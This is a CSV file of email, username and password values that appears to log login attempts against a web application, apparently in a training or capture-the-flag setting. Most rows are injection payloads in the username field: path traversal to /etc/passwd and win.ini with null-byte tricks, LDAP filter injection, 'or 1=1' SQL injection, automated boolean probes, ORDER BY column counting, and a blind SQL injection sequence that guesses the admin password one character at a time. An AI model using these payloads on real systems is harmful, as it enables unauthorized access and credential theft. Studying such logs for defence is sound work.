email,username,password
A2@a.com,-6661,1234567
admin,-7110,admin
pony@qq.com,-8221,1
1,-9208,1
pony1111213421rr@qq.com,.../obama11111,1qazxsw2
pony1111213421rr@qq.com,../../../../../../../../../../../../../../../../etc/passwd,1qazxsw2
pony1111213421rr@qq.com,../../../../../../../../../../../../../../../../etc/passwd\x00obama11111,1qazxsw2
pony1111213421rr@qq.com,..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini,1qazxsw2
pony1111213421rr@qq.com,..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini\x00obama11111,1qazxsw2
pony1111213421rr@qq.com,./obama11111,1qazxsw2
mike_pence@asu.edu,' or exists(select * from users where username='mike_pence' and length(password)<2)#,123
mike_pence@asu.edu,' or exists(select * from users where username='mike_pence' and length(password)=1)#,123
mike_pence@asu.edu,' or exists(select * from users where username='mike_pence' and length(password)=2)#,123
mike_pence@asu.edu,' or exists(select * from users where username='mike_pence' and length(password)=5)#,123
mike_pence@asu.edu,' or exists(select * from users where username='mike_pence' and length(password)>3)#,123
mike_pence@asu.edu,' or exists(select * from users where username='mike_pence' and length(password)>5)#,123
first@us.gov,""" or 1=1",123
tony@qq.com,""" or 1=1 ",pence
tony@qq.com,""" or 1=1 ;",pence
tony@qq.com,""" or 1=1 ;;",pence
first@us.gov,""" or 1=1 or ""a""=""a",123
tony@qq.com,""" OR 1=1;",tony
pence@whitehouse.gov,""" or 1=1)",pence
pence@whitehouse.gov,""" or 1=1)#",pence
1,"(SELECT CONCAT(0x7162787a71,(ELT(9353=9353,1)),0x71626a6b71))",1
A2@a.com,"(SELECT CONCAT(0x716a627071,(ELT(5039=5039,1)),0x716b626271))",1234567
pony@qq.com,"(SELECT CONCAT(0x7171627671,(ELT(2448=2448,1)),0x7178707a71))",1
admin,"(SELECT CONCAT(0x7176717071,(ELT(7426=7426,1)),0x716a6a6a71))",admin
1,"{""a"":""1",1
tony@qq.com,*,pence
pony1111213421rr@qq.com,*)(!(objectClass=*),1qazxsw2
pony1111213421rr@qq.com,*)(objectClass=*,1qazxsw2
pony1111213421rr@qq.com,/etc/passwd,1qazxsw2
1,1,1
1,1' and '1'='2'  order by 20 --',55555
1,1' and '1'='2'  order by 4 --',55555
1,1' and '1'='2'  order by 5 --',55555
1,1' and '1'='2'  order by 6 --',55555
1,1' and '1'='2'  order by 7 --',55555
1,1' and '1'='2'  order by 8 --',55555
1,1' and '1'='2'  order by 9 --',55555
pony@qq.com,1111dfdhjedjjdndnewthewht455,1
pony@qq.com,1111dfdhjedjjdndnewthewht455 AND 6335=4577,1
pony@qq.com,1111dfdhjedjjdndnewthewht455 AND 9627=9627,1
pony@qq.com,1111dfdhjedjjdndnewthewht455' AND (SELECT 0x70627446)='sgsO' AND 'hgbL'='hgbL,1
pony@qq.com,1111dfdhjedjjdndnewthewht455' AND 4215=7379 AND 'xQFj'='xQFj,1
pony@qq.com,1111dfdhjedjjdndnewthewht455' AND 8045=7405 AND 'hXcn'='hXcn,1
pony@qq.com,1111dfdhjedjjdndnewthewht455) AND 4613=4211 AND (7483=7483,1
pony@qq.com,1111dfdhjedjjdndnewthewht455) AND 9627=9627 AND (9496=9496,1
1@gmail.com,12,12345678
mike_pence@asu.edu,123asd' or exists(select * from users where username='mike_pence' and length(password)=2)#,123
mike_pence@asu.edu,123asd' or exists(select * from users where username='mike_pence' and length(password)>3)#,123
mike_pence@asu.edu,123asd' or exists(select * from users where username='mike_pence' and length(password)>4)#,123123
mike_pence@asu.edu,123asd' or exists(select * from users where username='mike_pence' and length(password)>5)#,123
1,2,1
1,2 AND 2324=2324,1
1,2 AND 5463=7373,1
1,2' AND (SELECT 0x67706663)='puIK' AND 'cKmC'='cKmC,1
1,2' AND 3683=9451 AND 'QXHY'='QXHY,1
1,2' AND 5159=8755 AND 'KnCr'='KnCr,1
1,2) AND 2324=2324 AND (4898=4898,1
1,2) AND 7624=5430 AND (5761=5761,1
pony1111213421rr@qq.com,39sfytcpfs)(!(objectClass=*),1qazxsw2
3,4,5
1,5751,1
admin,5985,admin
pony@qq.com,8361,1
Test123321,aaa,Test123321
Test123321,aaa' AND (SELECT 'BjKA')='wnEQ' AND 'aPDn'='aPDn,Test123321
Test123321,aaa' AND (SELECT 'OSSg')='IoYf' AND 'Qork'='Qork,Test123321
Test123321,aaa' AND 1297=6476 AND 'bRVs'='bRVs,Test123321
Test123321,aaa' AND 18=72 AND 'EGLV'='EGLV,Test123321
Test123321,aaa' AND 3283=5155 AND 'FdMk'='FdMk,Test123321
Test123321,aaa' AND 4968=3313 AND 'ZxJM'='ZxJM,Test123321
Test123321,aaa' AND 5126=1404 AND 'BeAd'='BeAd,Test123321
Test123321,aaa' AND 52=85 AND 'wkkj'='wkkj,Test123321
Test123321,aaa' AND 72=69 AND 'iHIr'='iHIr,Test123321
Test123321,aaa' AND 85=62 AND 'mAKd'='mAKd,Test123321
first@us.gov,abdcd,1234
pence@whitehouse.gov,admin,GoodInjectionCongrats
admin,admin AND 4661=4661,admin
admin,admin AND 7235=1608,admin
pony@qq.com,admin and SELECT * FROM users,123
pony@qq.com,admin union all SELECT * FROM users,1
admin@admin.com,admin'  and 1=2 and '1'='1,123456
a,admin' and 'a'='b,OdinJeCTioNcoNgrATs
admin,admin' AND (SELECT 0x446c4476)='RtWW' AND 'FWfK'='FWfK,admin
A2@a.com,admin' AND (SELECT 0x52567750)='Lxue' AND 'zUmK'='zUmK,1234567
admin,admin' AND 1420=6272 AND 'lVrA'='lVrA,admin
A2@a.com,admin' AND 4218=3073 AND 'WfBX'='WfBX,1234567
admin,admin' AND 8932=6570 AND 'HQHN'='HQHN,admin
A2@a.com,admin' AND 9507=1634 AND 'qvdn'='qvdn,1234567
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'a%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'b%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'c%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'd%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'e%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'f%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'gh%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'gi%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'gj%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'gk%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'gl%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'gm%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'gn%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goA%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goB%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goC%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goD%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goE%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goF%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goG%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goH%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goI%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goJ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goK%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goL%')#,123123
